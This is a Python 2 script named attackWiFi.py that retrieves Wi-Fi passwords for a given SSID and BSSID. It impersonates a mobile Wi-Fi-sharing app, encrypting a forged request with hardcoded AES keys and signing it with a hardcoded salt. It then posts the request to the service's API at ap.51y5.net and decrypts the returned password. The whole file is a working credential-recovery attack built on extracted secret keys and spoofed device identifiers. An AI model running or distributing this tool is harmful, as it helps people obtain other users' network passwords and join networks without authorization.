# -*- coding: utf-8 -*-
# @Author: lock
# @Date:   2017-01-21 22:39:51
# @Last Modified by:   lock
# @Last Modified time: 2017-01-22 09:47:30

import sys
import urllib
import urllib2
import json
import hashlib
from Crypto.Cipher import AES
import collections
import optparse
from urllib import unquote

def getMd5(str):
    md5 = hashlib.md5()
    md5.update(str)
    return md5.hexdigest()

def run(ssid, bssid):
    dt = collections.OrderedDict()
    dt['origChanId'] = 'xiaomi'
    dt['appId'] = 'A0008'
    dt['ts'] = '1459936625905'
    dt['netModel'] = 'w'
    dt['chanId'] = 'guanwang'
    dt['imei'] = '357541051318147'
    dt['qid'] = ''
    dt['mac'] = 'e8:92:a4:9b:16:42'
    dt['capSsid'] = 'hijack'
    dt['lang'] = 'cn'
    dt['longi'] = '103.985752'
    dt['nbaps'] = ''
    dt['capBssid'] = 'b0:d5:9d:45:b9:85'
    dt['bssid'] = bssid
    dt['mapSP'] = 't'
    dt['userToken'] = ''
    dt['verName'] = '4.1.8'
    dt['ssid'] = ssid
    dt['verCode'] = '3028'
    dt['uhid'] = 'a0000000000000000000000000000001'
    dt['lati'] = '30.579577'
    dt['dhid'] = '9374df1b6a3c4072a0271d52cbb2c7b6'
    dt = json.dumps(dt, ensure_ascii=False, separators=(',', ':'))
    dt = urllib.quote(dt)
    j = len(dt)
    i = 0
    while (i < 16 - j % 16):
        dt = dt + ' '
        i = i + 1
    cipher = AES.new(b"!I50#LSSciCx&q6E", AES.MODE_CBC, b"$t%s%12#2b474pXF")
    ed = cipher.encrypt(dt).encode('hex').upper()
    data = {}
    data['appId'] = 'A0008'
    data['pid'] = '00300109'
    data['ed'] = ed
    data['st'] = 'm'
    data['et'] = 'a'
    ss = ""
    for key in sorted(data):
        ss = ss + data[key]
    salt = '*Lm%qiOHVEedH3%A^uFFsZvFH9T8QAZe'
    sign = getMd5(ss + salt)
    data['sign'] = sign
    url = 'http://ap.51y5.net/ap/fa.sec'
    post_data = urllib.urlencode(data)
    req = urllib2.urlopen(url, post_data)
    content = req.read()
    result = json.loads(content.decode('utf-8'))
    try:
        if len(result['aps']) == 0:
            print "Not Found"
            sys.exit()
        epwd = result['aps'][0]['pwd']
        cipher = AES.new(b"!I50#LSSciCx&q6E", AES.MODE_CBC, b"$t%s%12#2b474pXF")
        pdd = cipher.decrypt(epwd.decode("hex"))
        length = int(pdd[:3])
        pwd = pdd[3:][:length]
        print "password is: " + unquote(pwd)
    except Exception, e:
        print 'sorry,get password fail! pleas test other wifi!'
        print 'error msg is:'+e.message


if __name__ == '__main__':
    parser = optparse.OptionParser(
        "use: \n\t" + "--ssid <wifi ssid> --bssid <wifi bssid>"
                      "\n\tExample: python attackWiFi.py --ssid ssid --bssid bssid"
    )
    parser.add_option('--ssid', dest='wifi_ssid', type='string', help='the wifi ssid info')
    parser.add_option('--bssid', dest='wifi_bssid', type='string', help='the wifi bssid info')
    (options, args) = parser.parse_args()
    ssid = options.wifi_ssid
    bssid = options.wifi_bssid
    if (ssid is None) or (bssid is None):
        print(parser.usage)
        exit(0)
    run(ssid,bssid)